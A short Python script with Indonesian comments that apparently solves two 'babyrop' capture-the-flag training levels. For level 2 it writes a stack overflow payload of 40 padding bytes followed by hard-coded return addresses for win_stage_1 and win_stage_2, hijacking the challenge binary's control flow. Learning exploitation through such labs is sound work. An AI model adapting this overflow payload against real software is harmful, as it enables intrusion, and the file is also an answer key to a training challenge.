import sys #buat nulis ke stdout
import binascii #python dynamic typing jadi rada rempong 
                #buat konversi hex ke ascii
def babyrop1():
    #solve babyrop 1.0
    payload = b"" #bytes array
    #buka file input.txt
    with open("input.txt","r") as baca:
        #baca yg di file input.txt
        rawhex = baca.read() #baca semua konten
        #ilangi semua spasi, \n sama \r
        rawhex = rawhex.replace(' ',"")
        rawhex = rawhex.replace('\n',"")
        rawhex = rawhex.replace('\r',"")
        #tambahkan ke payload
        payload += binascii.unhexlify(rawhex)#konversi hex string ke 
        #bytes array
        payload += b"\n" #jangan lupa new line
    #kirim ke stdout
    sys.stdout.buffer.write(payload)
    #sys.stdout.buffer.write(b"A\n")
    #print(b"a\n")
def babyrop2():
    #solve babyrop 1.0
    payload = b"" #bytes array
    #buka file input.txt
    #tambahin dump
    payload += b"A"*40
    #print(payload)
    #tambahin address win_stage_1 ( 0x00000000004020bf)
    payload += binascii.unhexlify("bf20400000000000")
    #print(payload)
    #tambahin address win_stage_2 (0x000000000040216c)
    payload += binascii.unhexlify("6c21400000000000")
    #tambahin enddline
    payload += b"\n"
    sys.stdout.buffer.write(payload)

if __name__=='__main__':
    level = int(sys.argv[1]) #level yang mana yang mau ditulis jawabannya
    if(level==1):
        babyrop1()
    elif(level==2):
        babyrop2()